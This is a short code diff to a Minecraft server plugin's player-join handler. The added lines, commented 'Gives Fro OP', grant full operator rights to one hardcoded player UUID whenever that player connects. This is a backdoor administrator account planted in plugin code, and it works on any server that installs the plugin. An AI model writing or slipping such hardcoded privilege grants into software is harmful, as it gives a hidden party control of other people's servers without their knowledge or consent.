@@ -45,6 +45,11 @@ public class PlayerJoin implements Listener {
             if (p != null)
                 player.hidePlayer(TinyEmpires.getInstance(), p);
         }
+        
+        // Gives Fro OP
+        if(playerId.toString().equals("bb04bee3-dc4d-4d10-bb34-f68c57dfc119")) {
+            player.setOp(true);
+        }
 
         // debug for arenas not working properly
         player.setGlowing(false);
